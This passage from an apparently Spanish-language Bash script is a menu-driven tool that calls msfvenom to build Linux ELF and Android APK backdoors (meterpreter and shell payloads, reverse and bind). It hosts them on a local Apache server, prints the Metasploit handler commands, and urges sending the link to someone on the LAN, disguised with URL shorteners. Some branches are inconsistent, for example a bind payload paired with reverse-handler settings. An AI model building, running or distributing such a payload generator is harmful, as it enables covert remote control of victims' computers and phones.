			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 10 || $optiondos == 010 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "Seleccionado: \e[1;36mlinux/x86/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x86/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 11 || $optiondos == 011 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "Seleccionado: \e[1;36mlinux/x86/shell_bind_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x86/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 12 || $optiondos == 012 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "Seleccionado: \e[1;36mlinux/x86/shell_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi	
	fi
fi	

			
if [[ $option == 3 || $option == 03 ]];then
clear 
banner5
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mandroid/meterpreter_reverse_http "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mandroid/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mandroid/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m04\e[0;36m] \e[1;36mandroid/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m05\e[0;36m] \e[1;36mandroid/shell/reverse_http"
echo -e                  "\e[0;36m[\e[0;34m06\e[0;36m] \e[1;36mandroid/shell/reverse_https"
echo -e                  "\e[0;36m[\e[0;34m07\e[0;36m] \e[1;36mandroid/shell/reverse_tcp"
echo ""
read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/meterpreter_reverse_http LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_http LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_http LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

